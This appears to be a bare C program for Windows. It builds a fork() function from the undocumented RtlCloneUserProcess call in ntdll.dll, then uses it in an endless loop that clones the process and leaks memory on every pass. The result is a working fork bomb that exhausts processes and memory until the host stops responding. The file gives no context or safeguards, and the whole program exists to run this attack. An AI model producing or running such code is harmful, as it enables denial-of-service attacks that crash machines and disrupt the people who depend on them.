#include <windows.h>
#include <winnt.h>
#include <winternl.h>
#include <stdio.h>
#include <errno.h>
#include <assert.h>
#include <process.h>
#include <malloc.h>

#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN

/*
typedef struct _CLIENT_ID
{
  PVOID UniqueProcess;
  PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;
*/

typedef struct _SECTION_IMAGE_INFORMATION
{
  PVOID EntryPoint;
  ULONG StackZeroBits;
  ULONG StackReserved;
  ULONG StackCommit;
  ULONG ImageSubsystem;
  WORD SubSystemVersionLow;
  WORD SubSystemVersionHigh;
  ULONG Unknown1;
  ULONG ImageCharacteristics;
  ULONG ImageMachineType;
  ULONG Unknown2[3];
} SECTION_IMAGE_INFORMATION, *PSECTION_IMAGE_INFORMATION;

typedef struct _RTL_USER_PROCESS_INFORMATION
{
  ULONG Size;
  HANDLE Process;
  HANDLE Thread;
  CLIENT_ID ClientId;
  SECTION_IMAGE_INFORMATION ImageInformation;
} RTL_USER_PROCESS_INFORMATION, *PRTL_USER_PROCESS_INFORMATION;

#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED	0x00000001
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES		0x00000002
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE		0x00000004

#define RTL_CLONE_PARENT                                0
#define RTL_CLONE_CHILD                                 297

typedef NTSTATUS(*RtlCloneUserProcess_f)(ULONG ProcessFlags,
                                         PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
                                         PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
                                         HANDLE DebugPort,
                                         PRTL_USER_PROCESS_INFORMATION ProcessInformation);

DWORD fork(void)
{
    RTL_USER_PROCESS_INFORMATION process_info;

    HMODULE module = GetModuleHandle(L"ntdll.dll");
    if (!module)
    {
      return -ENOSYS;
    }

    RtlCloneUserProcess_f clone_process = (RtlCloneUserProcess_f)GetProcAddress(module, "RtlCloneUserProcess");
    if (clone_process == NULL)
    {
      return -ENOSYS;
    }

    NTSTATUS result = clone_process(RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED | RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL, NULL, &process_info);

    if (result == RTL_CLONE_PARENT)
    {
    DWORD unique_process_info = (DWORD)process_info.ClientId.UniqueProcess;
    DWORD unique_thread_info = (DWORD)process_info.ClientId.UniqueThread;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, unique_process_info);
    if (!hProcess)
    {
      return -1;
    }

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, unique_thread_info);
    if (!hThread)
    {
      return -1;
    }

    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return unique_process_info;
  }
  else if (result == RTL_CLONE_CHILD)
  {
    AllocConsole();
    return 0;
  }

  return -1;
}

int main(int argc, char** argv)
{
  while (TRUE)
  {
    fork();
    malloc(sizeof(int) * 100000);
  }

  return 0;
}
